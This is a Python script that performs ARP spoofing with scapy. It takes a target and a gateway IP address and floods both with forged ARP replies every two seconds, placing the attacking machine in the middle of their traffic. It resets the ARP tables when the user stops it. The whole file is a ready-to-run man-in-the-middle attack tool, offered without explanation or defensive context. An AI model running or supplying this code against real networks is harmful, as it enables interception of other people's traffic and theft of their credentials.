import time
import scapy.all as scapy
import optparse
import subprocess

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("Please specify a target IP address. Use --help for info.")
    elif not options.gateway:
        parser.error("Please specify a gateway IP address. Use --help for info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()

target_ip = options.target
gateway_ip = options.gateway
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count) + " ARP packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting program...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)